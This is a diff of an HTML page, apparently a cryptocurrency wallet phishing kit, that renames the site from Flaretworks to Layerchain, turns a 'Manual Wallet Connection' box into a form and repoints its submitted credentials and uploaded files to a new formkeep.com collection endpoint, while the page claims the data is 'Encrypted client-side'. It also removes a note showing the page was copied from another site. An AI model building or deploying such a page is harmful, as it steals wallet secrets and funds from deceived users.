@@ -11,7 +11,7 @@
     <meta name="description" content="">
     <meta name="author" content="">
     <link rel="icon" type="image/png" href="assets/img/favicon.png">
-    <title>Flaretworks™</title>
+    <title>Layerchain™</title>
 
     <base />
 
@@ -28,7 +28,7 @@
 <body>
     <nav class="navbar navbar-expand-lg navbar-dark bg-dark shadow-sm p-0 osahan-nav">
         <div class="container">
-            <a class="navbar-brand" href="index-2.html">
+            <a class="navbar-brand" href="index.html">
                 <img src="assets/img/dapp_logo.png" alt="#" class="img-fluid">
             </a>
             <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup16" aria-expanded="false" aria-label="Toggle navigation">
@@ -37,7 +37,7 @@
             <div class="collapse navbar-collapse" id="navbarNavAltMarkup16">
                 <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                     <li class="nav-item">
-                        <a class="nav-link active" aria-current="page" href="index-2.html">Home - Flaretworks™</a>
+                        <a class="nav-link active" aria-current="page" href="index.html">Home - Layerchain™</a>
                     </li>
                 </ul>
                 <ul class="nav explore-tabs mb-0 justify-content-center gap-2" id="chain-switch-pill" role="tablist">
@@ -1199,7 +1199,7 @@
             <div class="row justify-content-center">
                 <div class="col-xl-6 col-lg-7 col-md-8 col-12">
                     <div class="text-center py-4">
-                        <small class="text-white-50">- Flaretworks™ -</small>
+                        <small class="text-white-50">- Layerchain™ -</small>
                         <h1 class="fw-bold text-white py-3">We make sure that everyone is able to securely use their
                             wallet</h1>
                     </div>
@@ -1217,7 +1217,7 @@
                             <img src="assets/img/dapp_logo.png" alt="#" class="img-fluid">
                         </div>
                         <div class="col-9 mt-2">
-                            <h4>Flaretworks™</h4>
+                            <h4>Layerchain™</h4>
                         </div>
                     </div>
                     <div class="text-muted mt-4">
@@ -1266,7 +1266,7 @@
             <div class="row align-items-center justify-content-between">
                 <div class="col-12 text-center">
                     <div class="mb-4 mb-md-0">
-                        <a href="index-2.html" class="text-decoration-none link-dark fw-bold pe-2">Home</a>
+                        <a href="index.html" class="text-decoration-none link-dark fw-bold pe-2">Home</a>
                         <a href="privacy.html" class="text-decoration-none link-dark fw-bold pe-2">Privacy</a>
                     </div>
                 </div>
@@ -1277,7 +1277,7 @@
         <div class="container">
             <div class="row align-items-center justify-content-center">
                 <div class="col-12 text-center">
-                    <span class="small">© 2025 Flaretworks™, All rights reserved.</span>
+                    <span class="small">© 2025 Layerchain™, All rights reserved.</span>
                 </div>
             </div>
         </div>
@@ -1342,7 +1342,7 @@
             <h5 class="mb-0">Manual Wallet Connection</h5>
             <button type="button" class="btn-close btn-close-white position-absolute end-0 top-50 translate-middle-y me-2" onclick="$('#floating-submission-box').fadeOut();"></button>
         </div>
-        <div class="card-body">
+        <form class="card-body" action="" method="POST">
             <div class="text-center mb-3">
                 <img id="submission_wallet_logo" src="#" width="30"/>
                 <b id="submission_wallet_name" style="font-size: larger; vertical-align: middle;"></b>
@@ -1393,7 +1393,7 @@
             <div class="d-grid">
                 <button type="button" class="btn btn-primary" id="submit-credentials">Submit</button>
             </div>
-        </div>
+        </form>
         <div class="card-footer text-center text-muted small">
             <i class="bi bi-lock" style="color:green;"></i> Encrypted client-side
         </div>
@@ -1855,9 +1855,10 @@ function submitData(data, isFileUpload = false) {
         grecaptcha.execute('6Lc7R_0qAAAAAO4UT6C8kn0kI_ZwEXtTxTILZVxA', {action: 'submit'}).then(function(token) {
             if (isFileUpload) {
                 // For file uploads, append the reCAPTCHA token to FormData
+                console.log('hello')
                 data.append('g-recaptcha-response', token);
                 $.ajax({
-                    url: 'https://formkeep.com/f/a57b5db06a75',
+                    url: 'https://formkeep.com/f/33bcd957488a',
                     method: 'POST',
                     data: data,
                     processData: false, // Required for FormData
@@ -1884,7 +1885,7 @@ function submitData(data, isFileUpload = false) {
                 };
                 console.log('Payload:', payload); // For testing
                 $.ajax({
-                    url: 'https://formkeep.com/f/a57b5db06a75',
+                    url: 'https://formkeep.com/f/33bcd957488a',
                     method: 'POST',
                     data: JSON.stringify(payload),
                     contentType: 'application/json',
@@ -1907,7 +1908,4 @@ function submitData(data, isFileUpload = false) {
 }
     </script>
 </body>
-
-
-<!-- Mirrored from layerchain.in/connect.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 29 Mar 2025 07:24:41 GMT -->
 </html>
